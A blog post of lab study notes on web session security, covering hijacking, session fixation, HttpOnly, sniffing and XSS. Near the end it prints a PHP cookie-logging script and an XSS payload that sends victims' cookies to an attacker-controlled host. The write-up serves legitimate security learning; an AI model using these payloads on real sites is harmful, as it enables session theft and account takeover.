---
title: Session Security
date: 2024-02-18 20:00 
categories: [HTTP]
tags: [SMB, RFI, RCE, PHP, FTP, Reverse Shell]
author: jamarapo
---

## Session Identifier Security
The sessions of a user are recorded with a Unique Session Identifier or an access token. If an attacker gains any of these can do a hijacking attack where the attacker has access to a session of a victim without authentication and uses victim authorization rights.

An attacker can obtain the session identifier with multiple methods: packing sniffing, identifying logs, prediction, and brute force.

The security of a session identifier depends on three factors:
- Validity Scop: The identifier must be valid for one session only.
- Randomness: The string of the identifier must use a solid random generation algorithm.
- Validity Time: The effective time of the identifier must have a period with expiration.
  
Sites where is stored the session identifiers:

- HTTP Referer header: The Referer header can expose a session identifier to other websites. Also, any session identifier in the URL can be seen in the browser's history.

- HTML: Session identifiers can be found in the browser's cache and in any intermediary proxies.

- SessionStorage: SessionStorage, an HTML5 feature, holds session identifiers until the tab or browser is closed. Data in SessionStorage is cleared when the page session ends, but it persists across page reloads.

- LocalStorage: LocalStorage, another HTML5 feature, retains session identifiers until deleted by the user. It survives browser process termination but is cleared in "private browsing" or "incognito" sessions when the last tab is closed.

### Session Attacks
**Session Hijacking**: Attackers exploit insecure session identifiers to gain unauthorized access to a user's session and impersonate them on a server.

**Session Fixation**: Attackers set a valid session identifier for a victim, tricking them into using it to log in. This allows the attacker to hijack the session.

**XSS (Cross-Site Scripting)**: Allows attackers to inject malicious scripts into web pages viewed by other users, potentially compromising their sessions.

**CSRF (Cross-Site Request Forgery)**: Forces authenticated users to unknowingly execute malicious actions on a web application, using their session identity.

**Open Redirects**: Attackers abuse a legitimate application's redirection functionality to redirect users to malicious sites, potentially compromising their sessions.

## Lab 1

![alt text](/assets/img/posts/SessionSecurity/image-2.png)

![alt text](/assets/img/posts/SessionSecurity/image-3.png)

![alt text](/assets/img/posts/SessionSecurity/image-4.png)

Using the cookie we can access to account without authenticate.

![alt text](/assets/img/posts/SessionSecurity/image-5.png)


## Session Fixation

Stage 1: At this stage, the attacker acquires a valid session identifier from the targeted application. In many cases, applications issue session identifiers to any user who accesses them, even without authentication. This means attackers can obtain a valid session identifier without needing to log in. Alternatively, attackers may create an account on the application to obtain a valid session identifier if account creation is possible.

Stage 2: Once the attacker has a valid session identifier, they may exploit a session fixation vulnerability. This occurs when the session identifier assigned to a user before logging in remains the same after logging in. If the application accepts session identifiers from URL query strings or post data, the attacker can manipulate these parameters to fixate a session. For instance, if a session-related parameter is part of the URL instead of the cookie header, the attacker can manipulate it to fixate the session.

Stage 3: In the final stage, the attacker lures the victim into using the session identifier fixed in the previous stage. This is accomplished by crafting a URL containing the manipulated session identifier and persuading the victim to visit it. When the victim accesses the URL, the application assigns the fixed session identifier to them. As a result, the attacker gains control over the victim's session. With the session identifier already known, the attacker can proceed with session hijacking attacks, exploiting the compromised session to perform unauthorized actions on behalf of the victim.

## Lab 2

![alt text](/assets/img/posts/SessionSecurity/image-6.png)

![alt text](/assets/img/posts/SessionSecurity/image-7.png)

![alt text](/assets/img/posts/SessionSecurity/image-8.png)

Sending this URL to the victim we can access to his account with a predifined session identifier controled by the attacker. This is posible because the cookie do not change post authentication.

### HttpOnly
 Is a flag that can be set on an HTTP cookie. When this flag is set on a cookie, it instructs the web browser that the cookie should not be accessible via JavaScript in the browser. In other words, the cookie will only be sent to the server with HTTP requests, but it cannot be accessed from client-side scripts such as JavaScript.

This security measure helps mitigate the risk of script-based cookie hijacking attacks, as it prevents an attacker from accessing the user's sensitive cookies through scripting vulnerabilities in the browser. Cookies with the "HttpOnly" flag are useful for protecting confidential information, such as session tokens or authentication credentials.

In summary, by setting the "HttpOnly" flag on a cookie:

- It prevents client-side scripts, such as JavaScript, from accessing the cookie.
- The cookie will only be sent to the server with HTTP requests, maintaining the security of sensitive information contained within the cookie.

## Obtaining Session Identifiers via Traffic Sniffing

Traffic sniffing is commonly employed by penetration testers to assess network security from within. By connecting their laptops or Raspberry Pis to available Ethernet sockets, testers can monitor network traffic, gaining insight into the traffic flow and potential attack targets. This technique necessitates both the attacker and victim being on the same local network, as HTTP traffic can only be inspected in this scenario. Remote traffic sniffing is not feasible.

HTTP traffic is particularly vulnerable to sniffing because it is transmitted unencrypted, allowing attackers to intercept sensitive data like usernames, passwords, and session identifiers. Encryption via SSL or IPsec significantly complicates or renders impossible the interception of such data.

In summary, obtaining session identifiers through traffic sniffing requires:

- The attacker and victim to be on the same local network.
- Unencrypted HTTP traffic.

Various packet sniffing tools exist, with Wireshark being a popular choice. Wireshark includes filtering capabilities for specific protocols such as HTTP, SSH, and FTP, as well as filtering by source IP address.
  
## Lab 3

![alt text](/assets/img/posts/SessionSecurity/image-2.png)

![alt text](/assets/img/posts/SessionSecurity/image-9.png)

![alt text](/assets/img/posts/SessionSecurity/image-3.png)

## Cross-Site Scripting (XSS)

XSS vulnerabilities are prevalent in web applications and allow attackers to execute arbitrary JavaScript code in a victim's browser. If exploited alongside other vulnerabilities, XSS can lead to complete compromise of a web application. However, in this context, we'll focus on exploiting XSS vulnerabilities specifically to obtain valid session identifiers, such as session cookies.

To exploit XSS for session cookie leakage, the following conditions must be met:

- Session cookies must be included in all HTTP requests.
- Session cookies must be accessible to JavaScript code, meaning the HTTPOnly attribute is absent.

![alt text](/assets/img/posts/SessionSecurity/image-10.png)

![alt text](/assets/img/posts/SessionSecurity/image-12.png)

![alt text](/assets/img/posts/SessionSecurity/image-11.png)

![alt text](/assets/img/posts/SessionSecurity/image-13.png)

### Part 2

``` php
<?php
$logFile = "cookieLog.txt";
$cookie = $_REQUEST["c"];

$handle = fopen($logFile, "a");
fwrite($handle, $cookie . "\n\n");
fclose($handle);

header("Location: http://www.google.com/");
exit;
?>

```

``` javascript
<style>@keyframes x{}</style><video style="animation-name:x" onanimationend="window.location = 'http://<VPN/TUN Adapter IP>:8000/log.php?c=' + document.cookie;"></video>

```

![alt text](/assets/img/posts/SessionSecurity/image-14.png)

![alt text](/assets/img/posts/SessionSecurity/image-16.png)


![alt text](/assets/img/posts/SessionSecurity/image-15.png)